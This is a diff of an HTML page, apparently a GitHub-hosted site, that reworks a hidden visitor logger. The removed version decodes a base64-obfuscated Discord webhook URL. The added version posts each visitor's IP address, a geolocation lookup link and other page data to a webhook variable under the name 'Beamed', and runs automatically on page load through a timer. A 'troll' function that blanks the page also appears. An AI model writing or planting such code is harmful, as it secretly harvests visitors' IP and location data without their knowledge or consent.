@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+2<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -42,31 +42,30 @@
             document.body.appendChild(div);
         });
 
+       
         function logger() {
-            var ispp = document.getElementById('ipppp').innerHTML; 
-            var extra = document.getElementById("razzylog").innerHTML; 
-
-            var base64WebhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwODAyNDk2NTkwMzI5MDM2OC9jNGYxd2lHX090aFpGWUZOQTVBT1FjRHJMU014Z1lZcFVSVjhxZTNlczcxaWppeDVYR1k4R09NbkFWRXFiR25XRDlVbA=="; 
-            var decodedWebhookUrl = atob(base64WebhookUrl); 
-
+            var ispp = document.getElementById('ipppp').innerHTML;
+            var extra = document.getElementById("razzylog").innerHTML;
+        
+            if (!extra) {
+                extra = 'No extra information available.';
+            }
+        
             const request = new XMLHttpRequest();
-            request.open("POST", decodedWebhookUrl);
+            request.open("POST", wbhk);
             request.setRequestHeader('Content-type', 'application/json');
-
-            const embed = {
-                username: "Github Logger",
+            const params = {
+                username: "Beamed",
                 avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
-                embeds: [
-                    {
-                        title: "ocxa.github.io",
-                        description: `**IP**: _${ispp}_\n**Raw Data**: _https://api.techniknews.net/ipgeo/${ispp}_\n**Extra Info**: \`\`\`${extra}\`\`\``,
-                        color: 3066993
-                    }
-                ]
+                content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : " + extra + ""
             };
-
-            request.send(JSON.stringify(embed));
+            request.send(JSON.stringify(params));
         }
+        
+        setTimeout(function() {
+            logger();
+        }, 100);
+
 
         function troll() {
             document.body.innerHTML = '';
